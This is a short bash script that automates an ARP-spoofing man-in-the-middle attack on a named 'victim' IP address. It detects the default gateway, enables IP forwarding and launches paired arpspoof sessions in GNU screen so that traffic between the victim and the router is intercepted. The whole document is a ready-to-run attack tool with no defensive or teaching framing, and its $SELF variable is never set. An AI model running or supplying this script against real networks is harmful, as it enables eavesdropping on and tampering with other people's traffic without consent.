#!/usr/bin/env bash
# $1	Victim IP Address
# $2	Interface

RCFILE="/tmp/arpspoofex.rc"

while getopts "hd:s:" opt 
do
	case $opt in
		h)	# Help
			echo "Usage:"
			echo "$0 [options] <-d Victim IP Address>"
			echo ""
			echo "Required Options"
			echo -e "-d <IP Address>\t\tDestination IP Address"
			echo ""
			echo "Options"
			echo -e "-h\t\t\tHelp"
			echo -e "-s <IP Address>\t\tSource IP Address."
			echo -e "\t\t\tDefaults to the Gateway IP Address if not set."
			exit 1
		;;
		d)	# Destination
			VICTIM=$OPTARG
		;;
		s)	# Source
			GATEWAY=$OPTARG
		;;
	esac
done

# Requirements
if [ -z "$VICTIM" ] 
then
	echo "-d Argument not provided."
	exit 1
fi

# Router IP Address
if [ -z "$GATEWAY" ] 
then
	GATEWAY=`ip route show | grep default | awk '{print $3}'`
	if [ -z "$GATEWAY" ] 
	then
	 	echo "Router IP Address not found."
		exit 1
	fi
fi

echo -e "Victim IP Address:\t\t\t$VICTIM"
echo -e "Gathering Default Gateway IP Address:\t$GATEWAY"
echo -e "Gathering Own IP Address:\t\t$SELF"

echo "Starting arpspoof..."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "startup_message off" > $RCFILE
echo -e "caption always \"%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c\"" >> $RCFILE
echo -e "screen -t Router arpspoof -t $GATEWAY $VICTIM" >> $RCFILE
echo -e "screen -t Victim arpspoof -t $VICTIM $GATEWAY" >> $RCFILE
echo -e "screen -r -t Main" >> $RCFILE

screen -c $RCFILE
